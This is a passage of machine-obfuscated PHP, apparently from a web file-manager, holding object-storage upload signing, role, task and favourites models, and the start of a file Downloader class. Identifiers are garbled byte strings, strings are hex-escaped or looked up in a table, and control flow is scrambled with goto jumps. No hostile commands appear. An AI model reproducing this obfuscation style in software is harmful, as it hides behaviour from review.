$C½¾ñ£¸ÕŞ = '') { $c”Â·Åˆ‰„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D·¼‹‰¢†Ø = $this->objectMeta($aÃ“Ï‡•è—); if (!$D·¼‹‰¢†Ø) { return !1; } $C½¾ñ£¸ÕŞ = $C½¾ñ£¸ÕŞ ? $C½¾ñ£¸ÕŞ : _get($D·¼‹‰¢†Ø, $c”Â·Åˆ‰„[217]); $C½¾ñ£¸ÕŞ = $C½¾ñ£¸ÕŞ ? $C½¾ñ£¸ÕŞ : _get($D·¼‹‰¢†Ø, $c”Â·Åˆ‰„[207], $c”Â·Åˆ‰„[33]); return $C½¾ñ£¸ÕŞ; } public function uploadFormData($Cñ…‹„¡Šê, $aŠô¾èİ”« = 3600) { $CŸ¹Öî´ëœ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÒŠ®–±ƒ° = $this->pathFather($Cñ…‹„¡Šê); $DÓäÍÖÃ» = $this->client->getHttpUploadPostParams($this->bucket, $fÒŠ®–±ƒ°, $CŸ¹Öî´ëœ[195], $aŠô¾èİ”«); return array_merge((array) $DÓäÍÖÃ», array($CŸ¹Öî´ëœ[179] => $this->getHost())); } public function multiUploadFormData($bƒ¡£¬Ù‰, $B¸«ÚáÔ´ê = 3600) { $F˜œçÈÆ‹ê =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dôã¶ë¹“ä = gmdate($F˜œçÈÆ‹ê[218]); $C‡¾Æ‚»é = array(); $E¿Š²”ç = $this->client->getUploadId($this->bucket, $bƒ¡£¬Ù‰, $C‡¾Æ‚»é); if (!$E¿Š²”ç) { return !1; } return array($F˜œçÈÆ‹ê[219] => $E¿Š²”ç, $F˜œçÈÆ‹ê[179] => $this->getHost() . $F˜œçÈÆ‹ê[8] . $this->pathEncode($bƒ¡£¬Ù‰), $F˜œçÈÆ‹ê[220] => $Dôã¶ë¹“ä, $F˜œçÈÆ‹ê[99] => $bƒ¡£¬Ù‰); } public function multiUploadAuthData($bœ±õÂÕ, $cÏÔÇ¬ÔŠù = array()) { goto CÄ„¹ìèë; CÄ„¹ìèë: $CÂè’„åø® =& $_SERVER[¶ªÕß‚ØÁŸ]; $bŒ‡œÂö³– = isset($cÏÔÇ¬ÔŠù[$CÂè’„åø®[220]]) ? $cÏÔÇ¬ÔŠù[$CÂè’„åø®[220]] : gmdate($CÂè’„åø®[218]); $EÜáº¸Î¡Ç = isset($cÏÔÇ¬ÔŠù[$CÂè’„åø®[170]]) ? $cÏÔÇ¬ÔŠù[$CÂè’„åø®[170]] : $CÂè’„åø®[33]; goto Aë„™’Ëæ­; cÁ©‰ïÙ½: $aĞĞ¹ÏôÉ = array($CÂè’„åø®[222], $CÂè’„åø®[33], $CÂè’„åø®[126], $CÂè’„åø®[33], "\170\x2d\141\x6d\172\55\144\x61\164\x65\72{$bŒ‡œÂö³–}", $CÂè’„åø®[8] . $this->bucket . $CÂè’„åø®[8] . $this->pathEncode($aÈ”«ÂÂÒÇ) . $EÜáº¸Î¡Ç); if (strpos($EÜáº¸Î¡Ç, $CÂè’„åø®[223]) === 0) { $aĞĞ¹ÏôÉ[0] = $CÂè’„åø®[224]; } if (isset($cÏÔÇ¬ÔŠù[$CÂè’„åø®[225]]) && $cÏÔÇ¬ÔŠù[$CÂè’„åø®[225]] == $CÂè’„åø®[226]) { $aĞĞ¹ÏôÉ[0] = $CÂè’„åø®[226]; } goto c‚ØŞ×÷Š‘; Aë„™’Ëæ­: $aÈ”«ÂÂÒÇ = $cÏÔÇ¬ÔŠù[$CÂè’„åø®[99]]; unset($cÏÔÇ¬ÔŠù[$CÂè’„åø®[99]]); if (isset($cÏÔÇ¬ÔŠù[$CÂè’„åø®[221]])) { $cÏÔÇ¬ÔŠù[$CÂè’„åø®[220]] = $bŒ‡œÂö³–; return $this->listUploadParts($aÈ”«ÂÂÒÇ, $cÏÔÇ¬ÔŠù); } goto cÁ©‰ïÙ½; c‚ØŞ×÷Š‘: $f½‘ŠÊ½Îˆ = implode($CÂè’„åø®[62], $aĞĞ¹ÏôÉ); $EÒ„¶³À‘ = base64_encode(hash_hmac($CÂè’„åø®[227], $f½‘ŠÊ½Îˆ, $this->secret, !0)); $CùÅ¯ÙµÌ† = $CÂè’„åø®[228] . $this->accessKey . $CÂè’„åø®[4] . $EÒ„¶³À‘; goto cÖß§’ä÷‹; cÖß§’ä÷‹: if (strpos($EÜáº¸Î¡Ç, $CÂè’„åø®[223]) === 0) { return array($CÂè’„åø®[229] => $CùÅ¯ÙµÌ†, $CÂè’„åø®[220] => $bŒ‡œÂö³–); } return $CùÅ¯ÙµÌ†; goto DåæÂŠä¢ë; DåæÂŠä¢ë: } public function listUploadParts($EÁˆ•›‹äø, $E¨ì‰­È£Ï = array()) { goto bââƒ”Íó; E’ææÄ»¹®: $cÁÇæ©½¼Õ = $this->multiUploadAuthData($EÁˆ•›‹äø, $E¨ì‰­È£Ï); if (empty($cÁÇæ©½¼Õ)) { return !1; } return array($E®¢’¦ñµå[229] => $cÁÇæ©½¼Õ, $E®¢’¦ñµå[220] => $E¨ì‰­È£Ï[$E®¢’¦ñµå[220]], $E®¢’¦ñµå[231] => $A¢…äÄ·˜¼); goto e·”Ü£Ü‹; bââƒ”Íó: $E®¢’¦ñµå =& $_SERVER[¶ªÕß‚ØÁŸ]; $dÔÁçºìõÃ = str_replace($E®¢’¦ñµå[230], $E®¢’¦ñµå[33], $E¨ì‰­È£Ï[$E®¢’¦ñµå[170]]); $A¢…äÄ·˜¼ = $this->client->listParts($this->bucket, $EÁˆ•›‹äø, $dÔÁçºìõÃ); goto aÙ¶õ¦ÀŒ‡; aÙ¶õ¦ÀŒ‡: if (!$A¢…äÄ·˜¼) { return !1; } unset($E¨ì‰­È£Ï[$E®¢’¦ñµå[221]], $E¨ì‰­È£Ï[$E®¢’¦ñµå[225]]); $E¨ì‰­È£Ï[$E®¢’¦ñµå[99]] = $EÁˆ•›‹äø; goto E’ææÄ»¹®; e·”Ü£Ü‹: } public function getHost() { return parent::getHost() . $_SERVER[¶ªÕß‚ØÁŸ][8] . $this->bucket; } public function size($f—Ù´Øİ†™) { $d¯–æğ‡¹¾ = $this->objectMeta($f—Ù´Øİ†™); return $d¯–æğ‡¹¾ ? $d¯–æğ‡¹¾[$_SERVER[¶ªÕß‚ØÁŸ][87]] : 0; } public function info($E½ˆƒÅˆÁ²) { if ($this->isFolder($E½ˆƒÅˆÁ²)) { return $this->folderInfo($E½ˆƒÅˆÁ²); } else { if ($this->isFile($E½ˆƒÅˆÁ²)) { return $this->fileInfo($E½ˆƒÅˆÁ²); } } return !1; } public function exist($Bƒ¡ï“ùÍÌ) { return $this->isFile($Bƒ¡ï“ùÍÌ) || $this->isFolder($Bƒ¡ï“ùÍÌ); } public function isFile($FËä²›Ô”Ê) { return !$this->isFolder($FËä²›Ô”Ê) && $this->objectMeta($FËä²›Ô”Ê); } public function isFolder($dæÑ…»—¼„) { return $this->cacheMethod($_SERVER[¶ªÕß‚ØÁŸ][232], $dæÑ…»—¼„); } protected function objectMeta($Dèö³òè¿ç) { return $this->cacheMethod($_SERVER[¶ªÕß‚ØÁŸ][233], $Dèö³òè¿ç); } protected function _objectMeta($A£šßŸ¡ŠĞ) { $FÇ»äõ®†• =& $_SERVER[¶ªÕß‚ØÁŸ]; $A£šßŸ¡ŠĞ = rtrim($A£šßŸ¡ŠĞ, $FÇ»äõ®†•[8]); try { $cµ–™ê‘Á† = $this->client->getObjectInfo($this->bucket, $A£šßŸ¡ŠĞ); if (!isset($cµ–™ê‘Á†[$FÇ»äõ®†•[217]]) && isset($cµ–™ê‘Á†[$FÇ»äõ®†•[234]])) { $cµ–™ê‘Á†[$FÇ»äõ®†•[217]] = $cµ–™ê‘Á†[$FÇ»äõ®†•[234]]; } } catch (OSS\Core\OssException $Fó»ğàè¸¾) { $cµ–™ê‘Á† = !1; } if (!$cµ–™ê‘Á†) { } return $cµ–™ê‘Á†; } protected function _isFolder($Dò‡ÉõŠŠ) { goto Dó‰”ô‘ª; aœÌÓ·ã”: $A¶ÁµË¯ä = $this->client->getBucket($this->bucket, $Dò‡ÉõŠŠ, null, 1); if (empty($A¶ÁµË¯ä)) { return !1; } $A¶ÁµË¯ä = array_values($A¶ÁµË¯ä); goto Eİ×„‰ä£Ï; Eİ×„‰ä£Ï: if (substr($A¶ÁµË¯ä[0][$aÈ©¤‘ÜÁÊ[28]], -1) == $aÈ©¤‘ÜÁÊ[8]) { return !0; } if (get_path_this($A¶ÁµË¯ä[0][$aÈ©¤‘ÜÁÊ[28]]) == get_path_this($Dò‡ÉõŠŠ)) { return !1; } return !0; goto EºÊæø¤§Í; Dó‰”ô‘ª: $aÈ©¤‘ÜÁÊ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dò‡ÉõŠŠ = rtrim($Dò‡ÉõŠŠ, $aÈ©¤‘ÜÁÊ[8]); if ($Dò‡ÉõŠŠ == $aÈ©¤‘ÜÁÊ[33] || $Dò‡ÉõŠŠ == $aÈ©¤‘ÜÁÊ[8]) { return !0; } goto aœÌÓ·ã”; EºÊæø¤§Í: } } goto E…šˆÂÒÔ‰; c£Œ¯š§¹: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x72\x6f\x6c\x65\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\141\x75\164\x68", "\154\141\x62\145\154", "\144\151\163\160\154\x61\171", "\163\171\163\x74\145\x6d", "\144\145\163\x63", "\x69\x67\x6e\x6f\x72\x65\x45\x78\x74", "\151\x67\156\157\x72\145\106\151\x6c\x65\x53\151\172\145", "\141\144\155\151\156\151\x73\164\162\141\164\x6f\x72", "\163\157\162\x74"); public function listData($C¾ƒ¨†Õ¬Ş = false, $Eà˜¥˜Ôö† = "\163\x6f\162\x74", $f°¶‚æåì­ = false) { $Bø„¬°Œù =& $_SERVER[¶ªÕß‚ØÁŸ]; $BÕä¦ÓŸ¥Ğ = parent::listData($C¾ƒ¨†Õ¬Ş, $Eà˜¥˜Ôö†, $f°¶‚æåì­); if (!$C¾ƒ¨†Õ¬Ş) { $dòÄñøò÷ã = $Bø„¬°Œù[2489]; foreach ($BÕä¦ÓŸ¥Ğ as $AÖ÷§—¾¥œ => $Bğ·¤¡óáë) { if ($Bğ·¤¡óáë[$Bø„¬°Œù[2490]] == 1) { $BÕä¦ÓŸ¥Ğ[$AÖ÷§—¾¥œ][$Bø„¬°Œù[413]] = $dòÄñøò÷ã; } } } return $BÕä¦ÓŸ¥Ğ; } public function update($c¶ÍÇã“…ğ, $e¾Ò±²º‡) { goto EñÚƒ¼Ÿ›; e ŠŒ…›Úì: if (!$e­ØõÌ†¨‰ || $A´Ğ›ôã©› && $A´Ğ›ôã©›[$fñ£ÔÀ°Ã¦[375]] != $e­ØõÌ†¨‰[$fñ£ÔÀ°Ã¦[375]]) { return !1; } if ($A´Ğ›ôã©›[$fñ£ÔÀ°Ã¦[2490]] == 1) { $e¾Ò±²º‡ = array($fñ£ÔÀ°Ã¦[28] => $e¾Ò±²º‡[$fñ£ÔÀ°Ã¦[28]], $fñ£ÔÀ°Ã¦[2125] => $e¾Ò±²º‡[$fñ£ÔÀ°Ã¦[2125]]); } $this->filterAuth($e¾Ò±²º‡[$fñ£ÔÀ°Ã¦[384]]); goto eÈî×î‰‡„; EñÚƒ¼Ÿ›: $fñ£ÔÀ°Ã¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e­ØõÌ†¨‰ = parent::listData($c¶ÍÇã“…ğ); $A´Ğ›ôã©› = $this->findByName($e¾Ò±²º‡[$fñ£ÔÀ°Ã¦[28]]); goto e ŠŒ…›Úì; eÈî×î‰‡„: return parent::update($c¶ÍÇã“…ğ, $e¾Ò±²º‡); goto a©×ë³Ğ¢½; a©×ë³Ğ¢½: } public function remove($fùòÕÕ‹›) { $a“É±¶¾äÍ = parent::listData($fùòÕÕ‹›); if (!$a“É±¶¾äÍ || $a“É±¶¾äÍ[$_SERVER[¶ªÕß‚ØÁŸ][1084]]) { return !1; } return parent::remove($fùòÕÕ‹›); } public function add($CïëƒÛÊª) { goto d‚œ«çœŠï; d‚œ«çœŠï: $FáÂ‰öà¡ã =& $_SERVER[¶ªÕß‚ØÁŸ]; $eØíùŸ½åã = $CïëƒÛÊª[$FáÂ‰öà¡ã[28]]; if ($this->findByName($eØíùŸ½åã)) { return !1; } goto CÙ–½çğ”; CÙ–½çğ”: $b“ëˆÆáôÜ = array($FáÂ‰öà¡ã[394] => $eØíùŸ½åã, $FáÂ‰öà¡ã[2113] => $FáÂ‰öà¡ã[33], $FáÂ‰öà¡ã[2109] => $FáÂ‰öà¡ã[2126], $FáÂ‰öà¡ã[2491] => 1, $FáÂ‰öà¡ã[2112] => 0, $FáÂ‰öà¡ã[2492] => 0, $FáÂ‰öà¡ã[2111] => $this->getSort()); $CïëƒÛÊª = array_merge($b“ëˆÆáôÜ, $CïëƒÛÊª); $this->filterAuth($CïëƒÛÊª[$FáÂ‰öà¡ã[384]]); goto EÉ«ê¢Õˆ‹; EÉ«ê¢Õˆ‹: return parent::insert($CïëƒÛÊª); goto fäò¢–š; fäò¢–š: } private function getSort() { $eòùæİ“ãë =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eãí‚ì¸ÀÔ = parent::listData(); $A¢¢½ãÍõÎ = array_to_keyvalue($Eãí‚ì¸ÀÔ, $eòùæİ“ãë[33], $eòùæİ“ãë[2128]); return empty($A¢¢½ãÍõÎ) ? 0 : max($A¢¢½ãÍõÎ) + 1; } private function filterAuth(&$EºŒß§¾Ï¨) { $D†©°ã÷” =& $_SERVER[¶ªÕß‚ØÁŸ]; $FëÄØÅ§ô¦ = array(); $EŸØäÚ³ = array_filter(explode($D†©°ã÷”[47], $EºŒß§¾Ï¨)); foreach ($EŸØäÚ³ as $EºŒß§¾Ï¨) { $aÕ†Ã›ŒÎŠ = explode($D†©°ã÷”[101], $EºŒß§¾Ï¨); if ($aÕ†Ã›ŒÎŠ[0] == $D†©°ã÷”[1787] && $aÕ†Ã›ŒÎŠ[1] != $D†©°ã÷”[1040]) { $A“™ß°Íîä = $aÕ†Ã›ŒÎŠ[0] . $D†©°ã÷”[101] . $aÕ†Ã›ŒÎŠ[1] . $D†©°ã÷”[2493]; if (!in_array($A“™ß°Íîä, $EŸØäÚ³)) { $FëÄØÅ§ô¦[] = $A“™ß°Íîä; } } $FëÄØÅ§ô¦[] = $EºŒß§¾Ï¨; } $EºŒß§¾Ï¨ = implode($D†©°ã÷”[47], $FëÄØÅ§ô¦); } public function sort($eîËâÎÛ¸¶, $CÉÃ§±ä‘¥) { return parent::update($eîËâÎÛ¸¶, $CÉÃ§±ä‘¥); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\164\x61\x73\153\x4c\151\x73\164"; public $field = array("\x6e\141\155\x65", "\x74\171\x70\145", "\x65\x76\x65\x6e\164", "\x74\151\x6d\x65", "\144\x65\163\x63", "\x73\171\x73\x74\x65\x6d", "\145\x6e\141\142\154\x65", "\154\141\163\164\122\x75\x6e", "\x73\x6f\x72\x74"); public function listData($b†Â½Ú¬–  = false, $Ešˆè¸Êğ† = "\163\x6f\x72\164", $eß¿í®ÓÕ = false) { return parent::listData($b†Â½Ú¬– , $Ešˆè¸Êğ†, $eß¿í®ÓÕ); } public function add($D ÕßÆïÀ) { $BˆàÁîŠ‹¶ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f×çòåËƒ = $this->findByName($D ÕßÆïÀ[$BˆàÁîŠ‹¶[28]]); if ($f×çòåËƒ) { return !1; } $D ÕßÆïÀ[$BˆàÁîŠ‹¶[1405]] = 0; $D ÕßÆïÀ[$BˆàÁîŠ‹¶[2128]] = $this->getSort(); return parent::insert($D ÕßÆïÀ); } private function getSort() { $EĞ²ÍÏ‘À =& $_SERVER[¶ªÕß‚ØÁŸ]; $e™èÏßãšÚ = parent::listData(); $dºõìÒŞÒ’ = array_to_keyvalue($e™èÏßãšÚ, $EĞ²ÍÏ‘À[33], $EĞ²ÍÏ‘À[2128]); return empty($dºõìÒŞÒ’) ? 0 : max($dºõìÒŞÒ’) + 1; } public function update($a½Ùñé•¤¼, $F¼Ğ˜­ÏÑ) { $dàÍ‡ÒÉÛè =& $_SERVER[¶ªÕß‚ØÁŸ]; $a†‘ãÉ£ƒ† = $this->listData($a½Ùñé•¤¼); $d˜ÓŒÄ“í = $this->findByName($F¼Ğ˜­ÏÑ[$dàÍ‡ÒÉÛè[28]]); if (!$a†‘ãÉ£ƒ† || $d˜ÓŒÄ“í && $d˜ÓŒÄ“í[$dàÍ‡ÒÉÛè[375]] != $a†‘ãÉ£ƒ†[$dàÍ‡ÒÉÛè[375]]) { return !1; } return parent::update($a½Ùñé•¤¼, $F¼Ğ˜­ÏÑ); } public function remove($A¾£»Ä¾½’, $Fæó™ŠÚŠ = false) { $Fƒ«ã„»É£ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EçÛËÀÚˆ = $this->listData($A¾£»Ä¾½’); if (!$EçÛËÀÚˆ) { return; } if (!$Fæó™ŠÚŠ && $EçÛËÀÚˆ[$Fƒ«ã„»É£[1084]] == $Fƒ«ã„»É£[93]) { return !1; } return parent::remove($A¾£»Ä¾½’); } public function enable($Dâñ™ğ«÷ï, $déõ´õ£°ë) { return $this->update($Dâñ™ğ«÷ï, array($_SERVER[¶ªÕß‚ØÁŸ][2483] => $déõ´õ£°ë)); } public function run($A·Û“¥ï†) { return $this->update($A·Û“¥ï†, array($_SERVER[¶ªÕß‚ØÁŸ][2494] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($BñÕÃ‹ÀÃŠ) { $eŸƒ‚…äÖ× =& $_SERVER[¶ªÕß‚ØÁŸ]; return array($eŸƒ‚…äÖ×[2495] => array(USER_ID, $eŸƒ‚…äÖ×[2496])); } protected function listData() { $Dº‰Ù÷£¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D¡×œË›‡Ø = array($Dº‰Ù÷£¬[1431] => USER_ID, $Dº‰Ù÷£¬[444] => 0); $C±ìë‘ á£ = $Dº‰Ù÷£¬[2497]; $b¦ï‘÷–—Ú = $this->field($C±ìë‘ á£)->where($D¡×œË›‡Ø)->order($Dº‰Ù÷£¬[2498])->select(); return $b¦ï‘÷–—Ú ? $b¦ï‘÷–—Ú : array(); } protected function resetCache() { } protected function listView() { goto b‘ã÷¶‚—; FİÇÍ§Š±Ï: $CÊ´ÎœÃêì = array_to_keyvalue($b‰åŒîô’Å, $få×Ş£íŠ[33], $få×Ş£íŠ[85]); if (!$CÊ´ÎœÃêì) { return $b“¹‰º´º; } $E˜”Ç—á‰ = 2000; goto B„Âê„ñ; B„Âê„ñ: $CÔèˆ°ÌÂ… = array($få×Ş£íŠ[391] => array($få×Ş£íŠ[392], $CÊ´ÎœÃêì)); $CÙ„ë·Ôº = Model($få×Ş£íŠ[766])->listSource($CÔèˆ°ÌÂ…, $E˜”Ç—á‰); $CÙ„ë·Ôº = array_merge($CÙ„ë·Ôº[$få×Ş£íŠ[83]], $CÙ„ë·Ôº[$få×Ş£íŠ[84]]); goto fš†µÁŠ; fš†µÁŠ: $CÙ„ë·Ôº = array_to_keyvalue($CÙ„ë·Ôº, $få×Ş£íŠ[377]); foreach ($b“¹‰º´º as $E·•’İ–î => $Aİ…á‚¤ñ) { $a¿Î²¿ãÜĞ = $CÙ„ë·Ôº[$Aİ…á‚¤ñ[$få×Ş£íŠ[85]]]; $a¿Î²¿ãÜĞ = $a¿Î²¿ãÜĞ ? $a¿Î²¿ãÜĞ : array(); $b“¹‰º´º[$E·•’İ–î] = array_merge($a¿Î²¿ãÜĞ, $Aİ…á‚¤ñ); } return $b“¹‰º´º; goto b„êÛÄ¥·ª; b‘ã÷¶‚—: $få×Ş£íŠ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b“¹‰º´º = $this->listData(); $b‰åŒîô’Å = array_filter_by_field($b“¹‰º´º, $få×Ş£íŠ[29], $få×Ş£íŠ[390]); goto FİÇÍ§Š±Ï; b„êÛÄ¥·ª: } protected function addFav($fÍÛŸè½¿†, $B¥øŞÎ‚º = '', $E­œ±ÅÛÏ¬ = "\x73\157\x75\x72\143\145") { goto F’Æ•×•œ˜; FÚ˜ºŠô’İ: if (!$B¥øŞÎ‚º && $E­œ±ÅÛÏ¬ == $bÜ”ÏáÚß®[390]) { $aÖÙË¶™ø² = Model($bÜ”ÏáÚß®[1121])->where(array($bÜ”ÏáÚß®[391] => $fÍÛŸè½¿†))->find(); if (!$aÖÙË¶™ø²) { return !1; } $B¥øŞÎ‚º = $aÖÙË¶™ø²[$bÜ”ÏáÚß®[28]]; } $B¥øŞÎ‚º = $this->getAutoName($B¥øŞÎ‚º); $eìš×°àŠŒ = array($bÜ”ÏáÚß®[1431] => USER_ID, $bÜ”ÏáÚß®[444] => 0, $bÜ”ÏáÚß®[394] => $B¥øŞÎ‚º, $bÜ”ÏáÚß®[395] => $fÍÛŸè½¿†, $bÜ”ÏáÚß®[396] => $E­œ±ÅÛÏ¬, $bÜ”ÏáÚß®[2111] => $B¦‘÷¼æ«º + 1); goto DÚôöÍÅ; båÃ•Åîé: $dªÆ–´©½ = array($bÜ”ÏáÚß®[1431] => USER_ID, $bÜ”ÏáÚß®[444] => 0); $B¦‘÷¼æ«º = $this->where($dªÆ–´©½)->max($bÜ”ÏáÚß®[2128]); if (!$B¦‘÷¼æ«º) { $B¦‘÷¼æ«º = 0; } goto FÚ˜ºŠô’İ; F’Æ•×•œ˜: $bÜ”ÏáÚß® =& $_SERVER[¶ªÕß‚ØÁŸ]; $dªÆ–´©½ = array($bÜ”ÏáÚß®[1431] => USER_ID, $bÜ”ÏáÚß®[444] => 0, $bÜ”ÏáÚß®[396] => $E­œ±ÅÛÏ¬, $bÜ”ÏáÚß®[395] => $fÍÛŸè½¿†); if ($this->where($dªÆ–´©½)->find()) { return !1; } goto båÃ•Åîé; DÚôöÍÅ: return $this->add($eìš×°àŠŒ); goto báÖ÷òÕµ; báÖ÷òÕµ: } protected function remove($DèÖó‚ÍÌ¿) { $c“§Ó„‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B†ê±š‰§ = array($c“§Ó„‘[1431] => USER_ID, $c“§Ó„‘[393] => $DèÖó‚ÍÌ¿); return $this->where($B†ê±š‰§)->delete(); } protected function removeByName($cœƒ³Ğ†å) { $FÎÍÆ¯ëë” =& $_SERVER[¶ªÕß‚ØÁŸ]; $DŞ¼äñÆÂ = array($FÎÍÆ¯ëë”[1431] => USER_ID, $FÎÍÆ¯ëë”[394] => $cœƒ³Ğ†å, $FÎÍÆ¯ëë”[444] => 0); return $this->where($DŞ¼äñÆÂ)->delete(); } protected function rename($cçïƒ§¡æ, $fâ„¶ĞÄƒ) { $B¥ºˆ‡¼¹È =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($cçïƒ§¡æ == $fâ„¶ĞÄƒ) { return !1; } $a½™Ùğ¾˜¼ = $this->getAutoName($fâ„¶ĞÄƒ); if ($fâ„¶ĞÄƒ != $a½™Ùğ¾˜¼) { return !1; } $C”İ–Ÿº‚å = array($B¥ºˆ‡¼¹È[1431] => USER_ID, $B¥ºˆ‡¼¹È[444] => 0, $B¥ºˆ‡¼¹È[28] => $cçïƒ§¡æ); return $this->where($C”İ–Ÿº‚å)->save(array($B¥ºˆ‡¼¹È[28] => $fâ„¶ĞÄƒ)); } protected function resetSort($b¦¿ìê”¡Ë) { $B·©óÖ±íÅ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b¦¿ìê”¡Ë = is_array($b¦¿ìê”¡Ë) ? $b¦¿ìê”¡Ë : array(); $B÷«Ş­Ò¿Î = array($B·©óÖ±íÅ[1431] => USER_ID); for ($B›ÅÓç×½Â = 0; $B›ÅÓç×½Â < count($b¦¿ìê”¡Ë); $B›ÅÓç×½Â++) { $B÷«Ş­Ò¿Î[$B·©óÖ±íÅ[393]] = $b¦¿ìê”¡Ë[$B›ÅÓç×½Â]; $this->where($B÷«Ş­Ò¿Î)->save(array($B·©óÖ±íÅ[2111] => $B›ÅÓç×½Â + 1)); } return !0; } protected function moveTop($DÍ¯îÑÉôÕ) { goto eßÄ»•§—; eßÄ»•§—: $bùáÚÇÑŞ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eµ¬ğµ‰Õˆ = array($bùáÚÇÑŞ[1431] => USER_ID, $bùáÚÇÑŞ[444] => 0); $Dˆô§ç‡Á = $this->where($eµ¬ğµ‰Õˆ)->where(array($bùáÚÇÑŞ[28] => $DÍ¯îÑÉôÕ))->find(); goto eÚâ¾çÖï˜; cÀ³„‡²æ: return $this->resetSort($eÑíñ³Œ¨); goto FäæìÇĞ¯¾; a½•Îİâ×º: $eöÄÆÈÊçÎ = $eÑíñ³Œ¨; $eÑíñ³Œ¨ = array_remove_value($eÑíñ³Œ¨, $Dˆô§ç‡Á[$bùáÚÇÑŞ[375]]); array_unshift($eÑíñ³Œ¨, $Dˆô§ç‡Á[$bùáÚÇÑŞ[375]]); goto cÀ³„‡²æ; eÚâ¾çÖï˜: if (!$Dˆô§ç‡Á) { return; } $eÑíñ³Œ¨ = $this->field($bùáÚÇÑŞ[375])->where($eµ¬ğµ‰Õˆ)->order($bùáÚÇÑŞ[2498])->select(); $eÑíñ³Œ¨ = array_to_keyvalue($eÑíñ³Œ¨, $bùáÚÇÑŞ[33], $bùáÚÇÑŞ[375]); goto a½•Îİâ×º; FäæìÇĞ¯¾: } protected function moveBottom($F§¹·‚™éÓ) { $DöôõñÅÆâ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c‰¦êæÖ‡Å = array($DöôõñÅÆâ[1431] => USER_ID, $DöôõñÅÆâ[444] => 0); $a¨§Áº‹–† = $this->where($c‰¦êæÖ‡Å)->max($DöôõñÅÆâ[2128]); $A—ˆ–§ùó = array($DöôõñÅÆâ[2128] => $a¨§Áº‹–† + 1); return $this->where($c‰¦êæÖ‡Å)->where(array($DöôõñÅÆâ[28] => $F§¹·‚™éÓ))->save($A—ˆ–§ùó); } private function getAutoName($EĞŞÂïè) { goto f·×“‘ÉÀ; c®¤ìƒĞæ±: return $EĞŞÂïè . "\50{$Fœ‚ã¼™ˆš}\x29"; goto E³À½¤“®; f·×“‘ÉÀ: $E‘Ö¯ÈñÖà =& $_SERVER[¶ªÕß‚ØÁŸ]; $CÁˆ‡õ¸ğœ = array($E‘Ö¯ÈñÖà[1431] => USER_ID, $E‘Ö¯ÈñÖà[444] => 0); $EÍËŠ¥µ† = $this->field($E‘Ö¯ÈñÖà[28])->where($CÁˆ‡õ¸ğœ)->select(); goto aË¥‚—òèï; aË¥‚—òèï: $EÍËŠ¥µ† = array_to_keyvalue($EÍËŠ¥µ†, $E‘Ö¯ÈñÖà[33], $E‘Ö¯ÈñÖà[28]); if (!$EÍËŠ¥µ† || !in_array($EĞŞÂïè, $EÍËŠ¥µ†)) { return $EĞŞÂïè; } for ($Fœ‚ã¼™ˆš = 0; $Fœ‚ã¼™ˆš < count($EÍËŠ¥µ†); $Fœ‚ã¼™ˆš++) { if (!in_array($EĞŞÂïè . "\x28{$Fœ‚ã¼™ˆš}\51", $EÍËŠ¥µ†)) { return $EĞŞÂïè . "\x28{$Fœ‚ã¼™ˆš}\51"; } } goto c®¤ìƒĞæ±; E³À½¤“®: } } goto f®«îËÔ’; eååÑ‚î¸÷: class Downloader { static function start($d¡Øšƒóø, $dÛˆ¿®œ°», $a¦ÔÈÔ¢æ = 10) { goto F…÷ä™®ºä; fØˆùºİÆ: if (!$d¡Øšƒóø) { return array($CåÁÕÜ´ó«[1036] => !1, $CåÁÕÜ´ó«[1038] => $CåÁÕÜ´ó«[1041]); } if (!$Cµ‘Õ¶¡…³[$CåÁÕÜ´ó«[1292]] || $Cµ‘Õ¶¡…³[$CåÁÕÜ´ó«[334]] == 0) { @unlink($bì“§¤ØŠÅ); @unlink($dÛˆ¿®œ°»); $FÙò„‹®Úö = self::fileDownloadFopen($d¡Øšƒóø, $dÛˆ¿®œ°», $Cµ‘Õ¶¡…³[$CåÁÕÜ´ó«[334]]); if ($FÙò„‹®Úö[$CåÁÕÜ´ó«[1036]]) { return $FÙò„‹®Úö; } else { @unlink($bì“§¤ØŠÅ); @unlink($dÛˆ¿®œ°»); $FÙò„‹®Úö = self::fileDownloadCurl($d¡Øšƒóø, $dÛˆ¿®œ°», !1, 0, $Cµ‘Õ¶¡…³[$CåÁÕÜ´ó«[334]]); @unlink($bì“§¤ØŠÅ); return $FÙò„‹®Úö; } } $f§Şå§æ¾Ï = is_file($bì“§¤ØŠÅ) ? filesize($bì“§¤ØŠÅ) : 0; goto aá«¾°ïÉ¿; EÀ›îñà: if (is_file($C¸Â–íéâÁ)) { $e¹Ü†ğ¶Ø¤ = file_get_contents($C¸Â–íéâÁ); $A¸©œ·„Ô = json_decode($e¹Ü†ğ¶Ø¤, 1); } if (file_exists($dÛˆ¿®œ°») && $CïÌÜØ¨İ == filesize($dÛˆ¿®œ°»)) { @unlink($bì“§¤ØŠÅ); @unlink($C¸Â–íéâÁ); return array($CåÁÕÜ´ó«[1036] => !0, $CåÁÕÜ´ó«[1038] => $CåÁÕÜ´ó«[1521]); } if ($A¸©œ·„Ô[$CåÁÕÜ´ó«[334]] != $CïÌÜØ¨İ) { $A¸©œ·„Ô = array($CåÁÕÜ´ó«[334] => $CïÌÜØ¨İ); } goto b¨èˆÌùÕ¶; b¨èˆÌùÕ¶: if ($f§Şå§æ¾Ï > $CïÌÜØ¨İ) { @unlink($bì“§¤ØŠÅ); } file_put_contents($C¸Â–íéâÁ, 